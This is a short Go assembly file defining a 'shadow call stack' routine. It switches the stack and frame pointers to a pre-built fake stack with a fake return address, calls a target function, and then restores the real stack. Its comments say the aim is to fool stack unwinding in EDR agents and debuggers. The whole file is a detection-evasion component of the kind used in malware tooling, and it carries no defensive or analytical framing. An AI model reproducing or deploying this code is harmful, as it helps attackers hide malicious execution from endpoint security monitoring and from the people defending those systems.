#include "textflag.h"

// Shadow Call Stack — swaps RSP/RBP to a pre-fabricated
// fake stack before calling the target function, then restores.
// This fools stack unwinding in EDR agents and debuggers.

// func swapStackAndCall(newRSP uintptr, fn uintptr)
//
// Saves the real RSP/RBP, switches to newRSP,
// calls fn (a Go function pointer), restores original stack.
TEXT ·swapStackAndCall(SB), NOSPLIT, $0-16
	// Save caller's registers
	MOVQ BP, R12       // Save real RBP
	MOVQ SP, R13       // Save real RSP

	// Load arguments
	MOVQ newRSP+0(FP), SP  // Switch to shadow stack
	MOVQ fn+8(FP), AX      // Target function

	// Build a fake frame on shadow stack (use PUSH/POP to satisfy both vet and runtime)
	PUSHQ $0               // Write fake return address (looks like entry point)
	MOVQ SP, BP            // Set RBP to shadow frame

	// Call the target function
	CALL AX
	
	POPQ CX                // Balance the PUSHQ to keep go vet happy

	// Restore real stack
	MOVQ R12, BP       // Restore real RBP
	MOVQ R13, SP       // Restore real RSP
	RET
